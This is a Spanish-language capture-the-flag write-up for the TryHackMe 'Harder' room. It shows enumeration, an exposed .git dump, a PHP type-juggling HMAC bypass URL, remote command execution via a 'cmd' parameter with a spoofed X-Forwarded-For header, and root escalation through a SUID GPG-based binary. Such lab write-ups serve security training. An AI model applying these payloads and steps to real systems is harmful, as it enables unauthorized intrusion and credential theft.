
# Write Up Harder - TryHackMe

![TryHackMe](https://img.shields.io/badge/TryHackMe-Medium-blue?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Dificultad-Medium-orange?style=for-the-badge)
![Alpine](https://img.shields.io/badge/Alpine%20Linux-Real%20World-green?style=for-the-badge)

**Write-up completo en español** de la máquina **Harder** (TryHackMe - Medium).  
Explotación de **.git expuesto** + **bypass HMAC por type juggling en PHP 7.3** + obtención de credenciales + **RCE web** vía parámetro cmd + escalada de privilegios con binario **SUID** y **GPG**.  
Enfoque real-world en Alpine Linux. Incluye payloads, pasos detallados y lecciones aprendidas.
<img width="1112" height="680" alt="image" src="https://github.com/user-attachments/assets/ba216e97-ff2c-4456-87e2-5ad3bd8a9c35" />

## Información de la Room
- **Room:** [Harder](https://tryhackme.com/room/harder)  
- **Dificultad:** Medium  
- **Tags:** Alpine, Real World, Git, Seclists  
- **Objetivo:** Obtener `user.txt` y `root.txt`

---

### Task 1: Introducción
La máquina está inspirada en hallazgos reales de pentesting. Sin rabbit holes, pero requiere atención a cada petición HTTP, re-escanear servicios web nuevos y usar wordlists de SecLists. Una vez dentro, es clave identificar que es **Alpine Linux** (configuraciones en `/etc/periodic`, `/var/backup`, etc.).

### Port Scan
```
nmap -sC -sV $IP
```

**Resultado:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
```

### Puerto 80
Página de error genérica. El header `X-Powered-By: PHP/7.3.19` confirma PHP-FPM detrás de nginx. Probamos `robots.txt`, `index.php`, etc. → todo 404.

### Gobuster (falla)
```
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```
Falla por **wildcard 200 OK**. Pasamos a Burp Suite.

### Analyzing request over Burp Suite
Interceptamos cualquier petición. En las cookies aparece `domain=pwd.harder.local`.  
Agregamos al `/etc/hosts`:
```
10.10.XX.XX   pwd.harder.local
```

### Visiting pwd.harder.local
Página de login. Credenciales por defecto **admin:admin** funcionan.

### Running Gobuster en el subdominio
```
gobuster dir -u http://pwd.harder.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```
Encuentra: `/auth.php` y `/secret.php`.

### Descubrimiento del directorio .git
Accedemos a `http://pwd.harder.local/.git/` → 403, pero existe. Usamos **git-dumper**:
```
git-dumper.py http://pwd.harder.local/ git-src
```

### Análisis del código fuente
**auth.php** (simple):
```
define('LOGIN_USER', "admin");
define('LOGIN_PASS', "admin");
```

**index.php** (clave):
```
require("auth.php");
require("hmac.php");
require("credentials.php");  // ← este archivo NO está en el repo
```

**hmac.php** (la joya):
```
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   die("missing get parameter");
}
require("secret.php");
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}
$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  die("extra security check failed");
}
?>
```

### LA VULNERABILIDAD: Bypass HMAC por Type Juggling
**¿Qué hace el código?**
1. Carga `$secret`.
2. Si existe `$_GET['n']`, sobrescribe `$secret`.
3. Calcula HMAC y compara con `$_GET['h']`.

**Falla crítica:** PHP no valida el tipo de `$_GET['n']`.  
Pasando `n[]=` (array vacío) → `hash_hmac()` devuelve **false** → `$secret = false`.

Luego:
```
$hm = hash_hmac('sha256', $_GET['host'], false);
```
`false` se convierte en string vacío → hash válido.

**Demostración:**
```
php -r 'echo hash_hmac("sha256", "pwd.harder.local", false) . "\n";'
```

**Payload de bypass:**
```
http://pwd.harder.local/?n[]=&h=5b622e20b29bdbcb0a4881f1d117d20a33a1f78a3c07ba85645567607e75cedf&host=pwd.harder.local
```

¡Classic **PHP Type Juggling + insecure HMAC**!

### Obtención de la shell inicial
Agregamos `shell.harder.local` al hosts.  
Login POST con **X-Forwarded-For: 10.10.10.10** → RCE vía parámetro `cmd`.

```
cmd=find / -name "*.sh" 2>/dev/null
```
Encontramos `/etc/periodic/15min/evs-backup.sh` con la contraseña SSH de **evs**.

```
ssh evs@$IP
```

### Escalada de privilegios
Binario SUID: `/usr/local/bin/execute-crypted`

```
find / -perm -4000 2>/dev/null
```

Pasos:
1. `gpg --import /var/backup/root@harder.local.pub`
2. `echo -n "cat /root/root.txt" > command`
3. `gpg -e -r root@harder.local command`
4. `/usr/local/bin/execute-crypted command.gpg`

¡Root obtenido!

### Flags
- **user.txt**: vía SSH como evs  
- **root.txt**: vía execute-crypted

### Conclusión y lecciones
1. **Git leaks** siguen siendo letales en 2026.
2. **Type juggling en PHP** + HMAC mal implementado = bypass trivial.
3. En Alpine: revisa `/etc/periodic`, `/var/backup` y binarios SUID con crypto.
4. X-Forwarded-For + cmd = RCE clásico.

 
 
